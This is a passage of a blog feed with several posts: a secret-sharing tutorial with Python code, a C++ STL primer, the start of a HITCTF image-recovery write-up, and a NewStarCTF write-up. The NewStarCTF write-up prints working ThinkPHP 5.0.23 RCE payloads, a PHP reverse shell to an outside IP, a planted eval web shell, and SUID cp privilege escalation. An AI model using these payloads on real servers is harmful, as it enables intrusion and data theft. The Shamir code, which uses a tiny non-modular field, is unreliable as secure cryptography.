<p>Python code for implementing the Shamir Secret Sharing Scheme:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Shamir</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"> </span><br><span class="line"><span class="comment"># a large size, make sures that the shares can not to be brute-forced</span></span><br><span class="line">FIELD_SIZE = <span class="number">10</span>**<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_coefficients</span>(<span class="params">t, secret</span>):</span><br><span class="line">    coeff = [random.randrange(<span class="number">0</span>, FIELD_SIZE) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t-<span class="number">1</span>)]</span><br><span class="line">    coeff.append(secret) <span class="comment"># secret is in the last</span></span><br><span class="line">    <span class="keyword">return</span> coeff</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_polynomial</span>(<span class="params">x, coefficients</span>):</span><br><span class="line">    polynomial = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> index, values <span class="keyword">in</span> <span class="built_in">enumerate</span>(coefficients[::-<span class="number">1</span>]): <span class="comment"># we need to reverse in here because the secret(a0) is in the last</span></span><br><span class="line">        polynomial += x ** index * values</span><br><span class="line">    <span class="keyword">return</span> polynomial</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_shares</span>(<span class="params">n, t, secret</span>):</span><br><span class="line">    coefficients = compute_coefficients(t,secret)</span><br><span class="line">    shares = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">        x = random.randrange(<span class="number">0</span>,FIELD_SIZE)</span><br><span class="line">        shares.append((x, compute_polynomial(x,coefficients)))</span><br><span class="line">    <span class="keyword">return</span> shares</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_secret</span>(<span class="params">shares</span>):</span><br><span class="line">    sums = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, share_i <span class="keyword">in</span> <span class="built_in">enumerate</span>(shares):</span><br><span class="line">        xi, yi = share_i</span><br><span class="line">        <span class="comment"># use decimal to make sure that we can get an accurate integer</span></span><br><span class="line">        prod = Decimal(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> j, share_j <span class="keyword">in</span> <span class="built_in">enumerate</span>(shares):</span><br><span class="line">            xj, _ = share_j</span><br><span class="line">            <span class="keyword">if</span> i!=j:</span><br><span class="line">                prod *= Decimal(Decimal(xj)/(xj-xi)) <span class="comment"># lagrange interception</span></span><br><span class="line">                </span><br><span class="line">        prod *= yi</span><br><span class="line">        sums += prod</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">round</span>(Decimal(sums),<span class="number">0</span>)) <span class="comment"># get the integer secret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Driver code</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># n peoples, and the threshold is t</span></span><br><span class="line">    t, n = <span class="number">3</span>, <span class="number">5</span></span><br><span class="line">    secret = <span class="number">114514</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Original Secret: <span class="subst">&#123;secret&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Generate the shares</span></span><br><span class="line">    shares = generate_shares(n, t, secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Shares: <span class="subst">&#123;<span class="string">&quot;, &quot;</span>.join(<span class="built_in">str</span>(share) <span class="keyword">for</span> share <span class="keyword">in</span> shares)&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Reconstruct the secret</span></span><br><span class="line">    <span class="comment"># Picking t shares randomly for</span></span><br><span class="line">    pool = random.sample(shares, t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Reconstructed secret: <span class="subst">&#123;reconstruct_secret(pool)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>Reference: <a href="https://www.geeksforgeeks.org/implementing-shamirs-secret-sharing-scheme-in-python/">https://www.geeksforgeeks.org/implementing-shamirs-secret-sharing-scheme-in-python/</a></p>
<h2 id="基于中国剩余定理的秘密共享方案"><a href="#基于中国剩余定理的秘密共享方案" class="headerlink" title="基于中国剩余定理的秘密共享方案"></a>基于中国剩余定理的秘密共享方案</h2><p>CRT(Chinese Remainder Theory) can be used to solve the Secret Sharing. My seudocode is as follow:</p>
<p><img src="/2023/11/13/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97-%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/image-1.png"></p>
<p>python code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基于中国剩余定理的秘密共享方案</span></span><br><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sp</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> solve_crt,generate_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_primes</span>(<span class="params">n, S</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成 n 个根据 S 调整大小的随机质数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    lower_bound = <span class="number">10</span>  <span class="comment"># 下限</span></span><br><span class="line">    upper_bound = <span class="built_in">int</span>(math.sqrt(S))  <span class="comment"># 上限</span></span><br><span class="line">    primes = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        primes.append(sp.randprime(lower_bound, upper_bound))</span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_conditions</span>(<span class="params">numbers, t, S</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    检查条件是否满足</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    numbers.sort()</span><br><span class="line">    product_smallest_t = math.prod(numbers[:t])</span><br><span class="line">    product_largest_t_minus_1 = math.prod(numbers[-(t-<span class="number">1</span>):])</span><br><span class="line">    <span class="keyword">return</span> product_smallest_t &gt; S <span class="keyword">and</span> product_largest_t_minus_1 &lt; S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_numbers</span>(<span class="params">n, t, S</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    找到满足条件的 n 个互质随机数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        numbers = generate_primes(n, S)</span><br><span class="line">        <span class="keyword">if</span> check_conditions(numbers, t, S):</span><br><span class="line">            <span class="keyword">return</span> numbers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_shares</span>(<span class="params">s, k, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Implements the Asmuth and Bloom&#x27;s CRT-based secret sharing algorithm.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    primes = find_numbers(n,k,s)</span><br><span class="line">    shares = [s % mi <span class="keyword">for</span> mi <span class="keyword">in</span> primes]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> shares, primes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">select_random_k_elements</span>(<span class="params">shares_zip, k</span>):</span><br><span class="line">    random_selection = random.sample(shares_zip, k)</span><br><span class="line">    selected_shares, selected_moduli = <span class="built_in">zip</span>(*random_selection)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(selected_shares), <span class="built_in">list</span>(selected_moduli)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example usage:</span></span><br><span class="line">secret = <span class="number">1145141919</span>  <span class="comment"># The secret to be shared</span></span><br><span class="line">k = <span class="number">3</span>                <span class="comment"># Minimum number of shares needed to reconstruct the secret</span></span><br><span class="line">n = <span class="number">5</span>                <span class="comment"># Total number of shares to be distributed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate the shares</span></span><br><span class="line">shares, moduli = generate_shares(secret, k, n)</span><br><span class="line">shares_zip = <span class="built_in">list</span>(<span class="built_in">zip</span>(shares, moduli))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shares:&quot;</span>, shares_zip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reconstruct the secret</span></span><br><span class="line">shares_pool, moduli_pool = select_random_k_elements(shares_zip, k)</span><br><span class="line">res = solve_crt(shares_pool,moduli_pool)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Secret:&quot;</span>, res)</span><br></pre></td></tr></table></figure>

<h2 id="Brickell-Secret-Sharing"><a href="#Brickell-Secret-Sharing" class="headerlink" title="Brickell Secret Sharing"></a>Brickell Secret Sharing</h2><p>The Brickell Secret Sharing Scheme is based on multi-dimensional vectors, allowing for the specification of designated groups for secret recovery.</p>
<p>Steps:</p>
<h3 id="Sharing-Generation"><a href="#Sharing-Generation" class="headerlink" title="Sharing Generation:"></a>Sharing Generation:</h3><ol>
<li>Assuming the secret &#x3D; $S$, $n$ &#x3D; 4, the vector dimension is $d$ &#x3D; 3.</li>
<li>Define the reconstruct rules ${(v1,v2,v3),(v1,v5)}$, means that person(1~3) and person(1 and 5) can recover the secret.</li>
<li>Generate v1 to v5, ensuring that any group of vectors can linearly construct $(1,0,0)$</li>
<li>Generate d-1 random numbers ${a_1,a_2…,a_{d-1}}$. In here, generate $a_1 &#x3D; S, a_2 &#x3D; 55$, $a_3 &#x3D; 28$</li>
<li>Compute the sharing, $S_i &#x3D; a * v_i$, and the sharing is $(S_i, i)$</li>
</ol>
<h3 id="Secret-Reconstruction"><a href="#Secret-Reconstruction" class="headerlink" title="Secret Reconstruction"></a>Secret Reconstruction</h3><ol>
<li>Collect the sharing, ensuring that the sharing groups follow the rules ${(v1,v2,v3),(v1,v5)}$, assuming the $S_1 &#x3D; 55, S_2 &#x3D; 10, S_3 &#x3D; 17$</li>
<li>use the sharing group to linearly construct $(1,0,0)$, $c_1v_1+c_2v_2+c_3v_3 &#x3D; (1,0,0)$, get the coefficients $c_1&#x3D;-1, c_2&#x3D;1, c_3&#x3D;1$</li>
<li>Recover the $S$, $S &#x3D; c_1S_1+c_2S_2+c_3S_3$</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Secret sharing schemes are widely used in privacy computing. Here is a summary of their advantages and disadvantages.</p>
<h3 id="Advantages"><a href="#Advantages" class="headerlink" title="Advantages"></a>Advantages</h3><ol>
<li>It allows for the addition of new shareholders without changing the existing shareholders’ secret shares, demonstrating excellent scalability.</li>
<li>Based on the original shared secret key, the secret shares can be invalidated by altering other terms without changing the constant term.</li>
</ol>
<h3 id="Disadvantages"><a href="#Disadvantages" class="headerlink" title="Disadvantages"></a>Disadvantages</h3><ol>
<li>It relies on the credibility of the secret distributor. If the distributor is dishonest and distributes a fake share to a participant, it can cause confusion during the sharing process.</li>
<li>Some participants may submit invalid secret shares, preventing the correct secret from being recovered. A secure point-to-point channel needs to be established between the secret distributor and the participants.</li>
</ol>
]]></content>
      <categories>
        <category>隐私计算</category>
      </categories>
      <tags>
        <tag>隐私计算</tag>
        <tag>秘密共享</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】Final thinkphp 漏洞与提权</title>
    <url>/2023/11/20/newstarctf2023-Final/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】Final-thinkphp-漏洞与提权"><a href="#【NewStarCTF2023】Final-thinkphp-漏洞与提权" class="headerlink" title="【NewStarCTF2023】Final thinkphp 漏洞与提权"></a>【NewStarCTF2023】Final thinkphp 漏洞与提权</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>打开靶机后, 是一个 thinkphp 的默认页面, 所以很有可能就是挖掘 thinkphp 的漏洞, 先在路径上输入一些默认参数查看其版本号.</p>
<p><img src="/2023/11/20/newstarctf2023-Final/image.png"></p>
<p>可以看到是 ThinkPHP V5.0.23.</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>去谷歌搜索 ThinkPHP V5.0.23 漏洞, 发现有 RCE 漏洞,用 POST 构造请求参数为 <code>/?s=captcha</code> 构造的 payload 为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>

<p>这边的用法是 <code>filter[]</code> 参数中输入要执行的命令类型,<code>server[REQUEST_METHOD]</code> 里输入要执行命令的参数. </p>
<p>构造 payload 发送后没有回显, 说明很有可能把 system 给禁止了, 所以构造下面这个 payload 看看他的 phpinfo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5</span><br></pre></td></tr></table></figure>

<p>看到了他把 <code>system</code> 命令给禁用了:</p>
<p><img src="/2023/11/20/newstarctf2023-Final/image-2.png"></p>
<p>所以这里使用其他的命令去绕过, 比如 <code>exec</code>, <code>passthru</code></p>
<p>构造 payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=passthru&amp;method=get&amp;server[REQUEST_METHOD]=ls /</span><br></pre></td></tr></table></figure>

<p>这样能够看到 ls 后的内容, 但是这里去 cat flag 的时候发现读不出来东西, 先弹个 shell, 构造 payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=passthru&amp;method=get&amp;server[REQUEST_METHOD]=php -r &#x27;$sock=fsockopen(&quot;公网ip&quot;, 监听端口);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>vps 上使用</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lvnp 端口</span><br></pre></td></tr></table></figure>

<p>成功反弹 shell, 然后输入命令</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ls -la /</span><br></pre></td></tr></table></figure>

<p>发现 flag 文件设置了高权限可读, 所以这里要想办法提权获取到文件.</p>
<p><img src="/2023/11/20/newstarctf2023-Final/image-3.png"></p>
<p>调用命令查看一下高权限的操作</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/20/newstarctf2023-Final/image-4.png"></p>
<p>发现 <code>cp</code> 命令是高权限操作, 但是我在提权过程中发现由于 用户的权限太低, 环境变量用不了, 又不能使用 <code>sudo</code> 命令, 而且也查看不了定时任务, 根本没办法用反弹的 shell 进行提权.</p>
<p>由于 thinkphp 那个漏洞似乎是可以写入一句话木马的, 所以尝试去写入一句话木马, 把输出流绑定到木马文件上, 然后用蚁剑链接, 用 <code>cp</code>　命令把文件内容复制到输出流上提权读取文件, 构造 payload 为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo &#x27;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27; &gt; /var/www/public/shell.php</span><br></pre></td></tr></table></figure>

<p>然后以 <code>shell.php</code> 作为路径, <code>cmd</code>作为链接密码, 即可 getshell</p>
<p>然后在蚁剑命令终端中, 尝试用 <code>cp</code> 命令将文件内容复制到输出流 <code>/dev/stdout</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cp /flag_dd3f6380aa0d /dev/stdout</span><br></pre></td></tr></table></figure>

<p>最后获得 flag.</p>
<p><img src="/2023/11/20/newstarctf2023-Final/image-1.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】算法基础与 STL</title>
    <url>/2023/11/20/Algorith-bases-and-STL/</url>
    <content><![CDATA[<h1 id="【算法】算法基础与-STL"><a href="#【算法】算法基础与-STL" class="headerlink" title="【算法】算法基础与 STL"></a>【算法】算法基础与 STL</h1><h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><p>时间复杂度是算法中基本操作执行次数的数量</p>
<p>时间复杂度排序为</p>
<p><img src="/2023/11/20/Algorith-bases-and-STL/image.png"></p>
<p>在一般的算法测评机中, 大约 1 秒钟能够执行 $5<em>10^8$ 条指令, 也就是说对于 $O(n^2)$ 时间复杂度的算法, 假设 $n$ 最大为 $10^5$, 那么需要的时间最大为 ${(10^{5})}^2&#x2F;5</em>10^8$ 约为 20 秒运行完毕. 在做题的过程中要提前计算运行时间来选择合适复杂度的算法.</p>
<h2 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h2><p>空间复杂度是运行时所需时间的度量</p>
<p>对于空间复杂度, 除了要计算所给限制以外, 还需要记忆各个类型最大值, 如下</p>
<p><img src="/2023/11/20/Algorith-bases-and-STL/image-1.png" alt="C,C++中常见的数值范围"></p>
<p>避免在写代码时发生类型上溢导致判题不通过.</p>
<h2 id="常见的-STL-容器"><a href="#常见的-STL-容器" class="headerlink" title="常见的 STL 容器"></a>常见的 STL 容器</h2><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vec;    <span class="comment">//定义</span></span><br><span class="line">vec.<span class="built_in">push_back</span>(a);   <span class="comment">//往后添加元素</span></span><br><span class="line">vec.<span class="built_in">insert</span>(vec.<span class="built_in">begin</span>()+<span class="number">1</span>,<span class="number">2</span>);  <span class="comment">//在下标[1]处插入 2  </span></span><br><span class="line">vec.<span class="built_in">pop_back</span>();     <span class="comment">//移除末尾元素</span></span><br><span class="line">vec.<span class="built_in">erase</span>(vec.<span class="built_in">begin</span>()+<span class="number">1</span>);   <span class="comment">//删除下标[1]处元素</span></span><br><span class="line">vec.<span class="built_in">resize</span>(<span class="number">3</span>)   <span class="comment">//只保留前 3 个元素</span></span><br><span class="line">vec.<span class="built_in">size</span>()  <span class="comment">//判断容器大小</span></span><br><span class="line">vec.<span class="built_in">front</span>() <span class="comment">//获取首元素</span></span><br><span class="line">vec[<span class="number">0</span>]  <span class="comment">//访问数组</span></span><br></pre></td></tr></table></figure>

<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p><code>set</code> 是集合元素, 会自动剔除重复元素, 内部是由红黑树构成的, 在插入元素时会自动帮你排序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line">set&lt;<span class="type">int</span>&gt; s  <span class="comment">//定义</span></span><br><span class="line">s.<span class="built_in">insert</span>(<span class="number">10</span>)    <span class="comment">//插入元素</span></span><br><span class="line">s.<span class="built_in">count</span>(<span class="number">10</span>) <span class="comment">//判断元素是否存在</span></span><br><span class="line"><span class="comment">//遍历 set</span></span><br><span class="line">set&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line"><span class="keyword">for</span>(it=s.<span class="built_in">begin</span>();it!=s.<span class="built_in">end</span>();it++)&#123;</span><br><span class="line">    cout&lt;&lt;*it&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//遍历 set(简写)</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i:s) cout&lt;&lt;i&lt;&lt;endl;</span><br></pre></td></tr></table></figure>

<h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p><code>map</code> 是映射集合, 内部由<strong>红黑树</strong>实现, 在插入元素时会自动平衡树且帮你排序, <code>map</code> 与 <code>vector</code> 相比, 除了数据结构不同, 最大的不同点就是按值查询的复杂度不同, 由于 <code>map</code> 是根据平衡二叉树实现的, 所以单次查找的时间复杂度为 $O(logn)$,如果 <code>vector</code> 没有排序,那么 而 <code>vector</code> 单次查找要遍历数组, 时间复杂度为 $O(n)$ , 如果加上排序的话二分查找的时间复杂度就是 $O(logn)$, 所以其实 <code>vector</code> 在大部分情况下已经可以代替 <code>map</code> 的使用, <code>map</code> 在插入或者删除时还要 new 和 delete 一个映射, 所带来的时间开销也是显著的, <code>map</code> 一般用于数据量不大，且需要有序的访问键值对时使用.</p>
<p>在不要求顺序查找时可以使用 <code>unordered_map</code>, 能够在不排序的情况下有 $O(logn)$ 复杂度的查找.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;    <span class="comment">//定义 map, 前面是键名后面是键值</span></span><br><span class="line">m[<span class="number">1</span>] = <span class="number">100</span>; <span class="comment">//赋值</span></span><br><span class="line">m[<span class="number">1</span>] = <span class="number">200</span>; <span class="comment">//修改值</span></span><br><span class="line">m.<span class="built_in">count</span>(<span class="number">10</span>);    <span class="comment">//计数,复杂度为 logn</span></span><br><span class="line">m.<span class="built_in">find</span>(<span class="number">10</span>); <span class="comment">//返回该元素对应的迭代器,如果不存在返回 end()</span></span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2023/11/20/Algorith-bases-and-STL/image-2.png"></p>
<p>使用 STL 的 <code>set</code> 容器去存储每一个字符串, 然后排序输出即可. 需要注意的是这里使用了 <code>sstream</code> 来读取字符流, <code>sstream</code> 可以将字符流中的字符以空格分开, 然后逐步赋值给其他变量.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">set&lt;string&gt; dict;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s,buf;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;s)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[i]))</span><br><span class="line">                s[i] = <span class="built_in">tolower</span>(s[i]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                s[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">stringstream <span class="title">ss</span><span class="params">(s)</span></span>;</span><br><span class="line">        <span class="keyword">while</span>(ss&gt;&gt;buf)&#123;</span><br><span class="line">            dict.<span class="built_in">insert</span>(buf);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(string str:dict)&#123;</span><br><span class="line">            cout&lt;&lt;str&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title>【HITCTF2023】 Network in network 神经网络图片恢复</title>
    <url>/2023/11/29/HITCTF-network-in-network/</url>
    <content><![CDATA[<h1 id="【HITCTF2023】-Network-in-network-神经网络图片恢复"><a href="#【HITCTF2023】-Network-in-network-神经网络图片恢复" class="headerlink" title="【HITCTF2023】 Network in network 神经网络图片恢复"></a>【HITCTF2023】 Network in network 神经网络图片恢复</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>拿到题目后, 有三个文件, 一个是模型源码, 一个是跑模型编码后的图片, 还有模型的 pt 参数文件.</p>
<p>源码为:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">m = trans(file)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br><span class="line"></span><br><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>通过观察源码, 整个过程是经过一个卷积层变为 5 个通道数, 然后 Relu 非线性变化, 在经过一个卷积层变为 10 个通道数, 然后经过 Relu 与池化后经过一个全连接层, 再做卷积和 sigmoid 得到编码后的图片.</p>
<p>注意到整个过程会对图片产生影响的只有线性层 <code>nn.Linear</code> , 其他层由于 kernel 很小, 做特征值处理后能够肉眼识别出 flag. 所以这里考虑复原 <code>sigmoid</code>, <code>Conv2d</code>, <code>Linear</code>.</p>
<h3 id="sigmoid-复原"><a href="#sigmoid-复原" class="headerlink" title="sigmoid 复原"></a>sigmoid 复原</h3><p>sigmoid 函数</p>
<p>$$y &#x3D; \frac{1}{1 + e^{-x}}$$</p>
<p>逆运算，求得 $x$：</p>
<p>$$x &#x3D; -\ln\left(\frac{1}{y} - 1\right)$$</p>
<h3 id="卷积层复原"><a href="#卷积层复原" class="headerlink" title="卷积层复原"></a>卷积层复原</h3><p>卷积层的函数</p>
<p> $$Y_{i,j,k} &#x3D; \sum_{m&#x3D;1}^{C_{in}} W_{m,k} \cdot X_{i,j,m} + b_k$$</p>
<p>其中 $W$ 为每个通道的卷积核权重, $b_k$ 为每个通道的偏置</p>
<p>做复原, 仅需</p>
<p>$$X &#x3D; \frac{Y_{i,j,k}-b_k}{\sum_{m&#x3D;1}^{C_{in}} W_{m,k}}$$</p>
<h3 id="全连接层复原"><a href="#全连接层复原" class="headerlink" title="全连接层复原"></a>全连接层复原</h3><p>全连接层的函数</p>
<p>$$Y &#x3D; XW^T + b$$</p>
<p>复原</p>
<p>$$X &#x3D; \frac{Y-b}{W^T}$$</p>
<p>以上这些层的权重参数都可以从 <code>net.pt</code> 文件中提取出来, 使用 pytorch 的 <code>detach()</code> 函数, 图像复原代码如下:</p>
